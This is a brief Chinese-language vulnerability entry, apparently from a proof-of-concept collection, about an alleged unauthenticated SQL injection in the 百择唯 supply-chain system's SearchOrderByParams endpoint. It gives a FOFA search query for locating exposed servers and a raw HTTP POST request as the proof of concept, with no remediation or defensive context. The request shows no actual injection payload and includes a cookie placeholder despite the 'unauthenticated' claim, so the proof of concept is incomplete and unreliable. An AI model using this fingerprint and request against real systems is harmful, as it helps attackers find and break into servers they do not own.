# 百择唯供应链存在SearchOrderByParams存在SQL注入漏洞

百择唯供应链存在SearchOrderByParams SQL注入漏洞，未经身份验证的攻击者通过漏洞，执行任意代码从而获取到服务器权限。

## fofa

```javascript
body="/Content/Css/_SiteCss/"
```

## poc

```javascript
POST /M/SearchOrderByParams HTTP/1.1
Host:
Content-Length: 17
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: 你的Cookie
Connection: keep-alive

Key=&SearchType=1
```

